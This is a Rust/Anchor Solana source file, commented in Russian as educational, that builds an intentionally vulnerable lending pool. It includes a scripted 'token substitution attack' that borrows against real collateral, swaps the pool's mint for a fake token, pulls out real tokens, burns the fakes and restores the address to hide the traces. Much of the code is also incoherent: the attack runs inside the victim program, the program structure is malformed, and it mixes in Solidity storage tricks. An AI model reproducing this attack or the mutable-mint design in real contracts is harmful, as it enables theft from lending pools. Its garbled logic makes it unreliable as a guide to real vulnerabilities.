use anchor_lang::prelude::*;
use anchor_spl::token::{self, Token, TokenAccount, Transfer, Mint, MintTo, Burn};
use std::collections::HashMap;

/**
 * Реализация механизмов подмены токенов для образовательных целей
 * 
 * ВНИМАНИЕ: Данный код демонстрирует уязвимости для их изучения и предотвращения!
 * Использование в реальных условиях может нарушать законодательство!
 */

#[derive(Accounts)]
pub struct InitializeVulnerableLending<'info> {
    #[account(
        init,
        payer = authority,
        space = 8 + 32 + 32 + 32 + 8 + 8 + 1 + 1,
        seeds = [b"vulnerable_lending", base_token_mint.key().as_ref()],
        bump,
    )]
    pub vulnerable_lending: Account<'info, VulnerableLendingPool>,
    
    #[account(mut)]
    pub authority: Signer<'info>,
    
    pub base_token_mint: Account<'info, Mint>,
    
    #[account(
        init,
        payer = authority,
        token::mint = base_token_mint,
        token::authority = vulnerable_lending,
    )]
    pub vault: Account<'info, TokenAccount>,
    
    pub token_program: Program<'info, Token>,
    pub system_program: Program<'info, System>,
    pub rent: Sysvar<'info, Rent>,
}

#[derive(Accounts)]
pub struct ExecuteTokenSubstitution<'info> {
    #[account(mut)]
    pub attacker: Signer<'info>,
    
    /// Уязвимый lending pool (позволяет менять адрес токена)
    #[account(
        mut,
        seeds = [b"vulnerable_lending", vulnerable_lending.current_token_mint.as_ref()],
        bump = vulnerable_lending.bump,
    )]
    pub vulnerable_lending: Account<'info, VulnerableLendingPool>,
    
    #[account(
        init_if_needed,
        payer = attacker,
        space = 8 + 32 + 32 + 8 + 8 + 8,
        seeds = [b"attack_position", attacker.key().as_ref(), vulnerable_lending.key().as_ref()],
        bump,
    )]
    pub attack_position: Account<'info, AttackPosition>,
    
    /// Реальный токен (например, USDC)
    pub real_token_mint: Account<'info, Mint>,
    #[account(mut)]
    pub attacker_real_token_account: Account<'info, TokenAccount>,
    
    /// Поддельный токен (создается атакующим)
    #[account(mut)]
    pub fake_token_mint: Account<'info, Mint>,
    #[account(mut)]
    pub attacker_fake_token_account: Account<'info, TokenAccount>,
    
    /// Vault уязвимого протокола
    #[account(mut)]
    pub vulnerable_vault: Account<'info, TokenAccount>,
    
    /// Authority для минтинга поддельного токена
    /// CHECK: Проверяется через seeds
    #[account(
        seeds = [b"fake_mint_authority", attacker.key().as_ref()],
        bump,
    )]
    pub fake_mint_authority: AccountInfo<'info>,
    
    pub token_program: Program<'info, Token>,
    pub system_program: Program<'info, System>,
    pub rent: Sysvar<'info, Rent>,
}

#[derive(Accounts)]
pub struct CreateFakeToken<'info> {
    #[account(mut)]
    pub attacker: Signer<'info>,
    
    #[account(
        init,
        payer = attacker,
        mint::decimals = 6, // Копируем decimals реального USDC
        mint::authority = fake_mint_authority,
    )]
    pub fake_token_mint: Account<'info, Mint>,
    
    /// CHECK: Authority для поддельного токена
    #[account(
        seeds = [b"fake_mint_authority", attacker.key().as_ref()],
        bump,
    )]
    pub fake_mint_authority: AccountInfo<'info>,
    
    pub token_program: Program<'info, Token>,
    pub system_program: Program<'info, System>,
    pub rent: Sysvar<'info, Rent>,
}

#[derive(Accounts)]
pub struct RestoreTokenAddress<'info> {
    #[account(mut)]
    pub attacker: Signer<'info>,
    
    #[account(mut)]
    pub vulnerable_lending: Account<'info, VulnerableLendingPool>,
    
    pub original_token_mint: Account<'info, Mint>,
}

// Уязвимый lending pool (позволяет менять адрес токена)
#[account]
pub struct VulnerableLendingPool {
    pub authority: Pubkey,
    pub original_token_mint: Pubkey,
    pub current_token_mint: Pubkey,    // 🚨 Этот адрес можно менять!
    pub vault: Pubkey,
    pub total_deposits: u64,
    pub total_borrowed: u64,
    pub bump: u8,
    pub is_substitution_active: bool,  // Флаг активной подмены
}

#[account]
pub struct AttackPosition {
    pub attacker: Pubkey,
    pub real_token_mint: Pubkey,
    pub fake_token_mint: Pubkey,
    pub collateral_amount: u64,
    pub borrowed_amount: u64,
    pub attack_timestamp: i64,
}

impl<'info> VulnerableLendingPool {
    /// Инициализация уязвимого lending протокола
    pub fn initialize_vulnerable(
        ctx: Context<InitializeVulnerableLending>,
        bump: u8,
    ) -> Result<()> {
        let pool = &mut ctx.accounts.vulnerable_lending;
        pool.authority = ctx.accounts.authority.key();
        pool.original_token_mint = ctx.accounts.base_token_mint.key();
        pool.current_token_mint = ctx.accounts.base_token_mint.key();
        pool.vault = ctx.accounts.vault.key();
        pool.total_deposits = 0;
        pool.total_borrowed = 0;
        pool.bump = bump;
        pool.is_substitution_active = false;
        
        msg!("🚨 Vulnerable lending pool initialized - TOKEN ADDRESS CAN BE CHANGED!");
        Ok(())
    }
    
    /// Создание поддельного токена
    pub fn create_fake_token(ctx: Context<CreateFakeToken>) -> Result<()> {
        msg!("🎭 Creating fake token with identical interface to real token");
        
        // Поддельный токен создается с теми же параметрами что и реальный
        // Но под полным контролем атакующего
        
        Ok(())
    }
    
    /// 🚨 КЛЮЧЕВАЯ УЯЗВИМОСТЬ: Функция подмены адреса токена
    pub fn substitute_token_address(
        ctx: Context<ExecuteTokenSubstitution>,
        collateral_amount: u64,
        borrow_amount: u64,
    ) -> Result<()> {
        msg!("🎭 EXECUTING TOKEN SUBSTITUTION ATTACK");
        
        let pool = &mut ctx.accounts.vulnerable_lending;
        let position = &mut ctx.accounts.attack_position;
        
        // Этап 1: Размещаем РЕАЛЬНЫЕ токены как залог
        msg!("Step 1: Depositing REAL tokens as collateral");
        
        let deposit_real = CpiContext::new(
            ctx.accounts.token_program.to_account_info(),
            Transfer {
                from: ctx.accounts.attacker_real_token_account.to_account_info(),
                to: ctx.accounts.vulnerable_vault.to_account_info(),
                authority: ctx.accounts.attacker.to_account_info(),
            },
        );
        token::transfer(deposit_real, collateral_amount)?;
        
        // Записываем позицию с РЕАЛЬНЫМ токеном
        position.attacker = ctx.accounts.attacker.key();
        position.real_token_mint = ctx.accounts.real_token_mint.key();
        position.fake_token_mint = ctx.accounts.fake_token_mint.key();
        position.collateral_amount = collateral_amount;
        position.attack_timestamp = Clock::get()?.unix_timestamp;
        
        pool.total_deposits += collateral_amount;
        
        // Этап 2: Занимаем против залога
        msg!("Step 2: Borrowing against real collateral");
        
        let pool_seeds = &[
            b"vulnerable_lending",
            pool.current_token_mint.as_ref(),
            &[pool.bump],
        ];
        let signer = &[&pool_seeds[..]];
        
        let borrow_real = CpiContext::new_with_signer(
            ctx.accounts.token_program.to_account_info(),
            Transfer {
                from: ctx.accounts.vulnerable_vault.to_account_info(),
                to: ctx.accounts.attacker_real_token_account.to_account_info(),
                authority: ctx.accounts.vulnerable_lending.to_account_info(),
            },
            signer,
        );
        token::transfer(borrow_real, borrow_amount)?;
        
        position.borrowed_amount = borrow_amount;
        pool.total_borrowed += borrow_amount;
        
        // Этап 3: 🎭 КЛЮЧЕВАЯ АТАКА - Подменяем адрес токена!
        msg!("Step 3: 🚨 SUBSTITUTING TOKEN ADDRESS!");
        msg!("Original token: {}", pool.current_token_mint);
        msg!("Fake token: {}", ctx.accounts.fake_token_mint.key());
        
        // Сохраняем оригинальный адрес и подменяем на поддельный
        pool.current_token_mint = ctx.accounts.fake_token_mint.key();
        pool.is_substitution_active = true;
        
        // Этап 4: Минтим поддельные токены себе
        msg!("Step 4: Minting fake tokens to attacker");
        
        let fake_mint_seeds = &[
            b"fake_mint_authority",
            ctx.accounts.attacker.key().as_ref(),
            &[ctx.bumps.fake_mint_authority],
        ];
        let fake_signer = &[&fake_mint_seeds[..]];
        
        let mint_fake = CpiContext::new_with_signer(
            ctx.accounts.token_program.to_account_info(),
            MintTo {
                mint: ctx.accounts.fake_token_mint.to_account_info(),
                to: ctx.accounts.attacker_fake_token_account.to_account_info(),
                authority: ctx.accounts.fake_mint_authority.to_account_info(),
            },
            fake_signer,
        );
        token::mint_to(mint_fake, collateral_amount)?;
        
        // Этап 5: "Выводим" залог (протокол думает что это поддельные токены)
        msg!("Step 5: 'Withdrawing' collateral (protocol thinks it's fake tokens)");
        
        // Протокол проверяет баланс поддельных токенов - у нас есть!
        // Но переводит РЕАЛЬНЫЕ токены из vault!
        let withdraw_real = CpiContext::new_with_signer(
            ctx.accounts.token_program.to_account_info(),
            Transfer {
                from: ctx.accounts.vulnerable_vault.to_account_info(),
                to: ctx.accounts.attacker_real_token_account.to_account_info(),
                authority: ctx.accounts.vulnerable_lending.to_account_info(),
            },
            signer,
        );
        token::transfer(withdraw_real, collateral_amount)?;
        
        // Сжигаем поддельные токены для маскировки
        let burn_fake = CpiContext::new(
            ctx.accounts.token_program.to_account_info(),
            Burn {
                mint: ctx.accounts.fake_token_mint.to_account_info(),
                from: ctx.accounts.attacker_fake_token_account.to_account_info(),
                authority: ctx.accounts.attacker.to_account_info(),
            },
        );
        token::burn(burn_fake, collateral_amount)?;
        
        // Обновляем позицию
        position.collateral_amount = 0; // "Залог выведен"
        pool.total_deposits -= collateral_amount;
        
        msg!("🎉 TOKEN SUBSTITUTION ATTACK COMPLETED!");
        msg!("Attacker extracted {} real tokens using fake token substitution", collateral_amount);
        msg!("Borrowed amount {} remains unpaid", borrow_amount);
        
        Ok(())
    }
    
    /// Восстановление оригинального адреса токена
    pub fn restore_original_token_address(
        ctx: Context<RestoreTokenAddress>,
    ) -> Result<()> {
        let pool = &mut ctx.accounts.vulnerable_lending;
        
        msg!("Restoring original token address");
        msg!("From: {}", pool.current_token_mint);
        msg!("To: {}", ctx.accounts.original_token_mint.key());
        
        pool.current_token_mint = ctx.accounts.original_token_mint.key();
        pool.is_substitution_active = false;
        
        msg!("✅ Original token address restored - attack traces covered");
        Ok(())
    }
    
    /// 🔍 Функция для демонстрации уязвимости
    pub fn demonstrate_vulnerability(
        ctx: Context<ExecuteTokenSubstitution>,
    ) -> Result<()> {
        let pool = &ctx.accounts.vulnerable_lending;
        
        msg!("🚨 DEMONSTRATING VULNERABILITY IN LENDING PROTOCOL");
        msg!("Current token address: {}", pool.current_token_mint);
        msg!("Original token address: {}", pool.original_token_mint);
        msg!("Substitution active: {}", pool.is_substitution_active);
        
        if pool.is_substitution_active {
            msg!("⚠️  WARNING: Token address has been substituted!");
            msg!("Protocol thinks it's working with: {}", pool.current_token_mint);
            msg!("But vault contains: tokens from {}", pool.original_token_mint);
            msg!("This allows extraction of real tokens while 'spending' fake ones!");
        }
        
        Ok(())
    }
}

// Дополнительные функции для демонстрации различных техник подмены

/// Подмена через storage manipulation
pub fn storage_manipulation_demo(
    ctx: Context<ExecuteTokenSubstitution>,
) -> Result<()> {
    msg!("🔧 DEMO: Storage slot manipulation technique");
    
    // В реальности это было бы через assembly:
    // assembly { sstore(TOKEN_ADDRESS_SLOT, FAKE_TOKEN_ADDRESS) }
    
    let pool = &mut ctx.accounts.vulnerable_lending;
    let original = pool.current_token_mint;
    
    // Прямая перезапись storage
    pool.current_token_mint = ctx.accounts.fake_token_mint.key();
    
    msg!("Storage manipulated: {} -> {}", original, pool.current_token_mint);
    
    Ok(())
}

/// Подмена через proxy pattern
pub fn proxy_substitution_demo(
    ctx: Context<ExecuteTokenSubstitution>,
) -> Result<()> {
    msg!("🔄 DEMO: Proxy pattern substitution");
    
    // Если протокол использует upgradeable proxy:
    // 1. Деплоим новую implementation с измененным адресом токена
    // 2. Обновляем proxy на новую implementation
    // 3. Выполняем операции
    // 4. Откатываем proxy на оригинальную implementation
    
    msg!("Proxy implementation would be swapped here");
    
    Ok(())
}

/// Подмена через reentrancy
pub fn reentrancy_substitution_demo(
    ctx: Context<ExecuteTokenSubstitution>,
) -> Result<()> {
    msg!("🔁 DEMO: Reentrancy-based substitution");
    
    // Во время reentrancy callback:
    // 1. Меняем адрес токена
    // 2. Выполняем операцию вывода
    // 3. Восстанавливаем адрес
    
    let pool = &mut ctx.accounts.vulnerable_lending;
    
    // Имитируем reentrancy callback
    let original = pool.current_token_mint;
    pool.current_token_mint = ctx.accounts.fake_token_mint.key();
    
    msg!("During reentrancy: token address changed");
    
    // Операция вывода происходит здесь...
    
    pool.current_token_mint = original;
    msg!("After reentrancy: token address restored");
    
    Ok(())
}

#[error_code]
pub enum TokenSubstitutionError {
    #[msg("Token substitution attack detected")]
    SubstitutionDetected,
    #[msg("Invalid token address")]
    InvalidTokenAddress,
    #[msg("Fake token creation failed")]
    FakeTokenFailed,
    #[msg("Address restoration failed")]
    RestorationFailed,
    #[msg("Vulnerability demonstration failed")]
    DemoFailed,
}